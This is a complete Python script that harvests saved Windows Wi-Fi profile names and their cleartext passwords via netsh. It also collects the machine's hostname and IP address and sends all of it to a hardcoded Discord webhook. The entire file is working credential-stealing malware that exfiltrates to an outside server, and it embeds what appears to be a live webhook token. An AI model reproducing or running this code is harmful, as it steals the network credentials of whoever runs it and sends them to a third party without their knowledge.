import subprocess
import re
import requests
import socket

WEBHOOK_URL = "https://discord.com/api/webhooks/1377022141123530933/bfwynJb5nko7Y5RJvHoHWIQik1yjf7pVM7_ICpZLYqvOW4TaPuB3S3Tim5q_YXYY3GSj"

def get_profiles():
    output = subprocess.check_output("netsh wlan show profiles", shell=True, encoding='utf-8', errors='ignore')
    return re.findall(r"All User Profile\s*:\s(.*)", output)

def get_password(profile):
    try:
        info = subprocess.check_output(
            f'netsh wlan show profile name="{profile}" key=clear',
            shell=True, encoding='utf-8', errors='ignore'
        )
        match = re.search(r"Key Content\s*:\s(.*)", info)
        return match.group(1) if match else "N/A"
    except subprocess.CalledProcessError:
        return "ERROR"

def send_to_discord(message):
    data = {"content": message}
    try:
        response = requests.post(WEBHOOK_URL, json=data)
        if response.status_code == 204:
            print("Sent to Discord webhook!")
        else:
            print(f"Failed to send webhook: {response.status_code}")
    except Exception as e:
        print(f"Error sending webhook: {e}")

def wifi():
    profiles = get_profiles()
    if not profiles:
        print("No Wi-Fi profiles found.")
        return
    
    message = "**Saved Wi-Fi Passwords:**\n"
    for profile in profiles:
        password = get_password(profile.strip())
        message += f"{profile.strip()}: {password}\n"

    for i in range(0, len(message), 1900):
        send_to_discord(message[i:i+1900])

def ipname():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    message = f"IP Address: `{ip_address}` from `{hostname}`"
    send_to_discord(message)

def mainapi():
    wifi()
    ipname()

if __name__ == "__main__":
    mainapi()
